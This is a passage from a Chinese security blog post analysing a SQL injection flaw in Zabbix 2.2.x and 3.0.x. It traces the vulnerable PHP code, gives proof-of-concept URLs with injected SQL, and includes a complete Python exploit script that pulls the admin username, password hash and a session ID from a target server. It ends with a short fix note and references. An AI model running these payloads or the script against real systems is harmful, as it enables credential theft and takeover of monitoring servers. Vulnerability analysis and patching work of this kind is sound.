class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * Update favorite values in DB profiles table.</span><br><span class="line"> *</span><br><span class="line"> * @param string	$idx		max length is 96</span><br><span class="line"> * @param mixed		$value		max length 255 for string</span><br><span class="line"> * @param int		$type</span><br><span class="line"> * @param int		$idx2</span><br><span class="line"> */</span><br><span class="line">public static function update($idx, $value, $type, $idx2 = 0) &#123;</span><br><span class="line">    if (is_null(self::$profiles)) &#123;</span><br><span class="line">        self::init();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (!self::checkValueType($value, $type)) &#123;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $profile = [</span><br><span class="line">        &apos;idx&apos; =&gt; $idx,</span><br><span class="line">        &apos;value&apos; =&gt; $value,</span><br><span class="line">        &apos;type&apos; =&gt; $type,</span><br><span class="line">        &apos;idx2&apos; =&gt; $idx2</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    $current = self::get($idx, null, $idx2);</span><br><span class="line">    if (is_null($current)) &#123;</span><br><span class="line">        if (!isset(self::$insert[$idx])) &#123;</span><br><span class="line">            self::$insert[$idx] = [];</span><br><span class="line">        &#125;</span><br><span class="line">        self::$insert[$idx][$idx2] = $profile;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        if ($current != $value) &#123;</span><br><span class="line">            if (!isset(self::$update[$idx])) &#123;</span><br><span class="line">                self::$update[$idx] = [];</span><br><span class="line">            &#125;</span><br><span class="line">            self::$update[$idx][$idx2] = $profile;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (!isset(self::$profiles[$idx])) &#123;</span><br><span class="line">        self::$profiles[$idx] = [];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    self::$profiles[$idx][$idx2] = $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现这里只是对$profiles变量做了更新操作，当然profileIdx2参数也赋值进去了，这里是没有insert注入操作的。我们再回到最开始的jsrpc.php，这里最后引入了page_footer.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">require_once dirname(__FILE__).&apos;/include/page_footer.php&apos;;</span><br></pre></td></tr></table></figure>
<p>我们再跟进page_footer.php，发现调用了CProfile类的flush方法如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//判断CProfle类是否被修改过，刚刚调用了update修改了~</span><br><span class="line">if (CProfile::isModified()) &#123;</span><br><span class="line">	DBstart();</span><br><span class="line">	$result = CProfile::flush();</span><br><span class="line">	DBend($result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们跟进flush方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">public static function flush() &#123;</span><br><span class="line">    $result = false;</span><br><span class="line"></span><br><span class="line">    if (self::$profiles !== null &amp;&amp; self::$userDetails[&apos;userid&apos;] &gt; 0 &amp;&amp; self::isModified()) &#123;</span><br><span class="line">        $result = true;</span><br><span class="line"></span><br><span class="line">        foreach (self::$insert as $idx =&gt; $profile) &#123;</span><br><span class="line">            foreach ($profile as $idx2 =&gt; $data) &#123;</span><br><span class="line">				//执行insert语句</span><br><span class="line">                $result &amp;= self::insertDB($idx, $data[&apos;value&apos;], $data[&apos;type&apos;], $idx2);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ksort(self::$update);</span><br><span class="line">        foreach (self::$update as $idx =&gt; $profile) &#123;</span><br><span class="line">            ksort($profile);</span><br><span class="line">            foreach ($profile as $idx2 =&gt; $data) &#123;</span><br><span class="line">                $result &amp;= self::updateDB($idx, $data[&apos;value&apos;], $data[&apos;type&apos;], $idx2);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return $result;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">private static function insertDB($idx, $value, $type, $idx2) &#123;</span><br><span class="line">    $value_type = self::getFieldByType($type);</span><br><span class="line"></span><br><span class="line">    $values = [</span><br><span class="line">        &apos;profileid&apos; =&gt; get_dbid(&apos;profiles&apos;, &apos;profileid&apos;),</span><br><span class="line">        &apos;userid&apos; =&gt; self::$userDetails[&apos;userid&apos;],</span><br><span class="line">        &apos;idx&apos; =&gt; zbx_dbstr($idx),</span><br><span class="line">        $value_type =&gt; zbx_dbstr($value),</span><br><span class="line">        &apos;type&apos; =&gt; $type,</span><br><span class="line">        &apos;idx2&apos; =&gt; $idx2</span><br><span class="line">    ];</span><br><span class="line">	//注入触发点，执行insert语句，造成注入</span><br><span class="line">    return DBexecute(&apos;INSERT INTO profiles (&apos;.implode(&apos;, &apos;, array_keys($values)).&apos;) VALUES (&apos;.implode(&apos;, &apos;, $values).&apos;)&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>至此，SQL注入产生</p>
<h2 id="0x03-漏洞证明"><a href="#0x03-漏洞证明" class="headerlink" title="0x03 漏洞证明"></a>0x03 漏洞证明</h2><p>在网上找了一个版本低于3.0.4的zabbix服务器，验证该poc</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jsrpc.php?type=9&amp;method=screen.get&amp;timestamp=1471403798083&amp;pageFile=history.php&amp;profileIdx=web.item.graph&amp;profileIdx2=1+or+updatexml(1,md5(0x11),1)+or+1=1)%23&amp;updateProfile=true&amp;period=3600&amp;stime=20160817050632&amp;resourcetype=17</span><br></pre></td></tr></table></figure>
<p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/zabbix-verify.png" alt=""><br>存在注入</p>
<h2 id="0x04漏洞EXP"><a href="#0x04漏洞EXP" class="headerlink" title="0x04漏洞EXP"></a>0x04漏洞EXP</h2><p>这是一个简单的漏洞利用exp python脚本，可以获取zabbix的用户名和密码以及session_id</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">##!/usr/bin/env python</span><br><span class="line">## coding=utf-8</span><br><span class="line"></span><br><span class="line">import urllib2</span><br><span class="line">import sys, os</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">def check():</span><br><span class="line">    payload = &quot;jsrpc.php?sid=0bcd4ade648214dc&amp;type=9&amp;method=screen.get&amp;timestamp=1471403798083&amp;mode=2&amp;screenid=&amp;groupid=&amp;hostid=0&amp;pageFile=history.php&amp;profileIdx=web.item.graph&amp;profileIdx2=999&apos;&amp;updateProfile=true&amp;screenitemid=&amp;period=3600&amp;stime=20160817050632&amp;resourcetype=17&amp;itemids%5B23297%5D=23297&amp;action=showlatest&amp;filter=&amp;filter_task=&amp;mark_color=1&quot;</span><br><span class="line">    try:</span><br><span class="line">        response = urllib2.urlopen(url + payload, timeout=10).read()</span><br><span class="line">    except Exception, e:</span><br><span class="line">        print e</span><br><span class="line">    else:</span><br><span class="line">        key_reg = re.compile(r&quot;INSERT\s*INTO\s*profiles&quot;)</span><br><span class="line">        if key_reg.findall(response):</span><br><span class="line">            return True</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def Inject(sql):</span><br><span class="line">    payload = url + &quot;jsrpc.php?sid=0bcd4ade648214dc&amp;type=9&amp;method=screen.get&amp;timestamp=1471403798083&amp;mode=2&amp;screenid=&amp;groupid=&amp;hostid=0&amp;pageFile=history.php&amp;profileIdx=web.item.graph&amp;profileIdx2=&quot; + urllib2.quote(</span><br><span class="line">        sql) + &quot;&amp;updateProfile=true&amp;screenitemid=&amp;period=3600&amp;stime=20160817050632&amp;resourcetype=17&amp;itemids[23297]=23297&amp;action=showlatest&amp;filter=&amp;filter_task=&amp;mark_color=1&quot;</span><br><span class="line">    try:</span><br><span class="line">        response = urllib2.urlopen(payload, timeout=10).read()</span><br><span class="line">    except Exception, msg:</span><br><span class="line">        print msg</span><br><span class="line">    else:</span><br><span class="line">        result_reg = re.compile(r&quot;Duplicate\s*entry\s*&apos;~(.+?)~1&quot;)</span><br><span class="line">        results = result_reg.findall(response)</span><br><span class="line">        if results:</span><br><span class="line">            return results[0]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    if len(sys.argv) != 2:</span><br><span class="line">        print u&apos;用法: &apos; + os.path.basename(sys.argv[0]) + u&apos; [Zabbix后台URL]&apos;</span><br><span class="line">        sys.exit()</span><br><span class="line">    url = sys.argv[1]</span><br><span class="line">    if url[-1] != &apos;/&apos;: url += &apos;/&apos;</span><br><span class="line">    passwd_sql = &quot;(select 1 from(select count(*),concat((select (select (select concat(0x7e,(select concat(name,0x3a,passwd) from  users limit 0,1),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)&quot;</span><br><span class="line">    session_sql = &quot;(select 1 from(select count(*),concat((select (select (select concat(0x7e,(select sessionid from sessions limit 0,1),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)&quot;</span><br><span class="line">    if check():</span><br><span class="line">        print u&apos;Zabbix 存在 SQL 注入漏洞！\n&apos;</span><br><span class="line">        print u&apos;管理员  用户名密码：%s&apos; % Inject(passwd_sql)</span><br><span class="line">        print u&apos;管理员  Session_id：%s&apos; % Inject(session_sql)</span><br><span class="line">    else:</span><br><span class="line">        print u&apos;Zabbix 不存在 SQL 注入漏洞！\n&apos;</span><br></pre></td></tr></table></figure>
<p>存在漏洞<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/zabbix-exp.png" alt=""></p>
<h2 id="0x05-漏洞修复"><a href="#0x05-漏洞修复" class="headerlink" title="0x05 漏洞修复"></a>0x05 漏洞修复</h2><p>升级到3.0.4<br>过滤参数，使用 intval 函数过滤 CProfile::insertDB 中的 $idx2 变量</p>
<h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><p>1 <a href="http://www.cnbraid.com/2016/08/18/zabbix303/" target="_blank" rel="noopener">PHP代码审计Zabbix 2.2.x, 3.0.x SQL注射漏洞</a><br>2 <a href="http://weibo.com/ttarticle/p/show?id=2309404010186686757714" target="_blank" rel="noopener">Zabbix SQL注入漏洞分析及修复方案</a><br>3 <a href="http://jaminzhang.github.io/security/Zabbix-latest-SQL-Injection-Vulnerability-and-EXP/" target="_blank" rel="noopener">Zabbix 最新 SQL 注入漏洞及 EXP</a></p>

  </div>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/tags/">Tags</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-背景"><span class="toc-number">1.</span> <span class="toc-text">0x01 背景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-漏洞分析"><span class="toc-number">2.</span> <span class="toc-text">0x02 漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-漏洞证明"><span class="toc-number">3.</span> <span class="toc-text">0x03 漏洞证明</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04漏洞EXP"><span class="toc-number">4.</span> <span class="toc-text">0x04漏洞EXP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-漏洞修复"><span class="toc-number">5.</span> <span class="toc-text">0x05 漏洞修复</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-参考"><span class="toc-number">6.</span> <span class="toc-text">0x06 参考</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zerokeeper.github.io/vul-analysis/zabbix-22x-30x-sql-injection-vulnerability-analysis-and-utilization-of-exp.html" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://zerokeeper.github.io/vul-analysis/zabbix-22x-30x-sql-injection-vulnerability-analysis-and-utilization-of-exp.html&text=Zabbix 2.2.x,3.0.x SQL注入漏洞分析及利用EXP" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zerokeeper.github.io/vul-analysis/zabbix-22x-30x-sql-injection-vulnerability-analysis-and-utilization-of-exp.html&title=Zabbix 2.2.x,3.0.x SQL注入漏洞分析及利用EXP" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zerokeeper.github.io/vul-analysis/zabbix-22x-30x-sql-injection-vulnerability-analysis-and-utilization-of-exp.html&is_video=false&description=Zabbix 2.2.x,3.0.x SQL注入漏洞分析及利用EXP" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Zabbix 2.2.x,3.0.x SQL注入漏洞分析及利用EXP&body=Check out this article: http://zerokeeper.github.io/vul-analysis/zabbix-22x-30x-sql-injection-vulnerability-analysis-and-utilization-of-exp.html" target="_blank" rel="noopener"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://zerokeeper.github.io/vul-analysis/zabbix-22x-30x-sql-injection-vulnerability-analysis-and-utilization-of-exp.html&title=Zabbix 2.2.x,3.0.x SQL注入漏洞分析及利用EXP" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://zerokeeper.github.io/vul-analysis/zabbix-22x-30x-sql-injection-vulnerability-analysis-and-utilization-of-exp.html&title=Zabbix 2.2.x,3.0.x SQL注入漏洞分析及利用EXP" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zerokeeper.github.io/vul-analysis/zabbix-22x-30x-sql-injection-vulnerability-analysis-and-utilization-of-exp.html&title=Zabbix 2.2.x,3.0.x SQL注入漏洞分析及利用EXP" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://zerokeeper.github.io/vul-analysis/zabbix-22x-30x-sql-injection-vulnerability-analysis-and-utilization-of-exp.html&title=Zabbix 2.2.x,3.0.x SQL注入漏洞分析及利用EXP" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zerokeeper.github.io/vul-analysis/zabbix-22x-30x-sql-injection-vulnerability-analysis-and-utilization-of-exp.html&name=Zabbix 2.2.x,3.0.x SQL注入漏洞分析及利用EXP&description=&lt;h2 id=&#34;0x01-背景&#34;&gt;&lt;a href=&#34;#0x01-背景&#34; class=&#34;headerlink&#34; title=&#34;0x01 背景&#34;&gt;&lt;/a&gt;0x01 背景&lt;/h2&gt;&lt;p&gt;该漏洞于8月12日由安全研究员 1N3@CrowdShield 和 Brandon Perry 负责任地披露于 Full Disclosure,两人都在邮件中公开了 PoC，如下：&lt;/p&gt;
&lt;figure class=&#34;highlight plain&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;需要高权限用户&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;latest.php?output=ajax&amp;amp;sid=&amp;amp;favobj=toggle&amp;amp;toggle_open_state=1&amp;amp;toggle_ids[]=15385); select * from users where (1=1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;普通guest用户&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;jsrpc.php?type=9&amp;amp;method=screen.get&amp;amp;timestamp=1471403798083&amp;amp;pageFile=history.php&amp;amp;profileIdx=web.item.graph&amp;amp;profileIdx2=1+or+updatexml(1,md5(0x11),1)+or+1=1)%23&amp;amp;updateProfile=true&amp;amp;period=3600&amp;amp;stime=20160817050632&amp;amp;resourcetype=17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;漏洞影响范围&lt;br&gt;凡使用Zabbix2.2.x、3.0.x 的网站（在3.0.4版本中已修复）可能导致敏感数据泄漏、服务器被恶意攻击者控制进而造成更多危害等。&lt;br&gt;Zabbix简介&lt;br&gt;zabbix是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。能监视各种网络参数，保证服务器系统的安全运营；并提供灵活的通知机制以让系统管理员快速定位/解决存在的各种问题。&lt;br&gt;&lt;img src=&#34;https://static-1257872780.cos.ap-shanghai.myqcloud.com/zabbix.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2019 zerokeeper
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/tags/">Tags</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">

    <!-- jquery -->
<script src="/lib/jquery/jquery.min.js"></script>
<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
<!-- clipboard -->

  <script src="/lib/clipboard/clipboard.min.js"></script>
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight .code pre").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      target: function(trigger) {
        return trigger.nextElementSibling;
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>

<script src="/js/main.js"></script>
<!-- search -->

<!-- Google Analytics -->

    <script type="text/javascript">
        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
        ga('create', 'UA-150447622-1', 'auto');
        ga('send', 'pageview');
    </script>

<!-- Baidu Analytics -->

    <script type="text/javascript">
        var _hmt = _hmt || [];
        (function() {
            var hm = document.createElement("script");
            hm.src = "https://hm.baidu.com/hm.js?678fcadf6468f171c83dbf3d406feaaf";
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(hm, s);
        })();
    </script>

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'zerokeeper';

        (function(){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
    </script>


</body>
</html>
